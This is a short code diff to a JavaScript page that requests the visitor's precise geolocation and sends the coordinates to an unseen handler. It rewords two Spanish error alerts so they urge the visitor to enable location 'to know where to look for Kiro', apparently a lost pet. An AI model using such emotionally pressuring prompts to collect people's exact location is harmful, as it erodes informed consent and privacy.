@@ -113,7 +113,7 @@
           enviarUbicacion(position.coords.latitude, position.coords.longitude);
         },
         error => {
-          alert("No se pudo obtener la ubicación.");
+          alert("No se pudo obtener la ubicación. Por favor, actívala para saber dónde buscar a Kiro");
           window.location.href = "https://sites.google.com/view/kiromunozslimming/contacto";
         },
         { enableHighAccuracy: true, timeout: 10000 }
@@ -125,7 +125,7 @@
           enviarUbicacion(position.coords.latitude, position.coords.longitude);
         },
         error => {
-          alert("No se pudo obtener la ubicación o no se concedió permiso.");
+          alert("No se pudo obtener la ubicación o no se concedió permiso. Por favor, activa tu ubicación para saber dónde buscar a Kiro");
           window.location.href = "https://sites.google.com/view/kiromunozslimming/contacto";
         },
         { enableHighAccuracy: true, timeout: 10000 }
